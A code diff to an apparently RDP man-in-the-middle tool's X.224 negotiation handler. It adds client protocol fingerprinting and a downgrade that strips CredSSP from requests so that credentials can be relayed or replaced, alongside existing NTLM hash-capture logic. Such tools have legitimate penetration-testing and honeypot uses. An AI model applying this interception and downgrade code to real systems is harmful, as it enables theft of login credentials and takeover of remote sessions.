@@ -77,11 +77,48 @@ class X224MITM:
         else:
             self.log.info("No cookie for this connection")
 
+        # Store requestedProtocols for fingerprinting
+        if self.originalNegotiationRequest.requestedProtocols is not None:
+            self.state.clientRequestedProtocols = int(self.originalNegotiationRequest.requestedProtocols)
+            protoNames = []
+            rp = self.state.clientRequestedProtocols
+            if rp & 0x01:
+                protoNames.append("SSL")
+            if rp & 0x02:
+                protoNames.append("HYBRID")
+            if rp & 0x08:
+                protoNames.append("HYBRID_EX")
+            if rp == 0:
+                protoNames.append("STANDARD_RDP")
+            self.log.info("Requested protocols: 0x%(raw)02x (%(names)s)", {
+                "raw": rp, "names": "+".join(protoNames)
+            })
+
+        # Log Correlation ID if present
+        if self.originalNegotiationRequest.correlationID:
+            corrId = self.originalNegotiationRequest.correlationID.hex()
+            self.state.correlationId = corrId
+            self.log.info("Correlation ID: %(corrId)s", {"corrId": corrId})
+
         chosenProtocols = self.originalNegotiationRequest.requestedProtocols
 
         if chosenProtocols is not None:
             # Tell the server we only support the allowed authentication methods.
             chosenProtocols &= self.state.config.authMethods
+
+        # When we have replacement credentials and are NOT already in ntlmCapture
+        # replay, strip CRED_SSP from the request to force HYBRID_REQUIRED_BY_SERVER.
+        # This makes the server reject with a failure, triggering the well-tested
+        # credential-relay path in onConnectionConfirm. Without this, the server
+        # accepts HYBRID directly and we enter the relay passthrough which breaks
+        # mstsc's two-connection cert-probe pattern.
+        if (not self.state.ntlmCapture
+            and not self.state.serverRequiresNLA
+            and self.state.config.replacementUsername is not None
+            and self.state.config.replacementPassword is not None
+            and not self.state.config.nlaFallback
+            and chosenProtocols is not None):
+            chosenProtocols &= ~(NegotiationProtocols.CRED_SSP | NegotiationProtocols.EARLY_USER_AUTHORIZATION_RESULT)
 
         if self.state.ntlmCapture:
             # If we want to capture the NTLM hash, we need to put back CredSSP in here.
@@ -158,6 +195,13 @@ class X224MITM:
             # Credential-replay mode: tell client TLS-only (we handle NLA on server side)
             payload = parser.write(NegotiationResponsePDU(NegotiationType.TYPE_RDP_NEG_RSP, 0x00, NegotiationProtocols.SSL))
         else:
+            # Relay path: forward the server's selectedProtocols verbatim.
+            # Record whether CRED_SSP was selected so RDPMITM.doClientTls
+            # knows to verify the cert pubkey matches the server's.
+            self.state.credSspSelected = bool(
+                response.selectedProtocols is not None
+                and response.selectedProtocols & NegotiationProtocols.CRED_SSP
+            )
             payload = parser.write(NegotiationResponsePDU(NegotiationType.TYPE_RDP_NEG_RSP, 0x00, response.selectedProtocols))
 
         # FIXME: This should be done based on what authentication method the server selected, not on what
